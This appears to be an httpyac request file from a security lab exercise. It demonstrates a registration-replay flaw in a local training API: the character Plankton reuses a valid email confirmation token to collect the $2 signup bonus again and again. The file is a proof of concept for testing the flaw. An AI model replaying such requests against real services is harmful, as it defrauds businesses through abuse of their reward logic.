# @import ../common/setup.http
@base = {{base_host}}/v107
@mailpit = http://127.0.0.1:8025/api/v1

### Plankton registers to get the $2 signup bonus
# @name register_request
POST {{base}}/auth/register
Content-Type: application/json

{ "email": "plankton@chum-bucket.sea" }

?? status == 200

###
GET {{mailpit}}/messages?limit=1

{{
  const messages = response.parsedBody.messages;
  exports.message_id = messages[0].ID;
}}

?? status == 200

###
GET {{mailpit}}/message/{{message_id}}

{{
  const body = response.parsedBody.Body || response.parsedBody.Text;
  const tokenMatch = body.match(/token=([a-zA-Z0-9\-_.]+)/);
  exports.token = tokenMatch ? tokenMatch[1] : "";
}}

?? status == 200

### He completes registration and gets $2
POST {{base}}/auth/register
Content-Type: application/json

{
    "token": "{{token}}",
    "password": "i_love_my_wife",
    "name": "Plankton"
}

?? status == 200

# -- Exploit: Plankton can replay regirstration request with his valid token and his new credentials --

### Plankton replays registration with his valid token AND his new credentials
POST {{base}}/auth/register
Authorization: Basic plankton@chum-bucket.sea:i_love_my_wife
Content-Type: application/json

{
    "token": "{{token}}",
    "password": "i_love_my_wife",
    "name": "Plankton"
}

?? status == 200

### Now Plankton has more money: if he continues to replay the registration request, he will receive additional bonuses!
GET {{base}}/account/info
Authorization: Basic plankton@chum-bucket.sea:i_love_my_wife

?? status == 200
?? js response.parsedBody.balance == 4.00
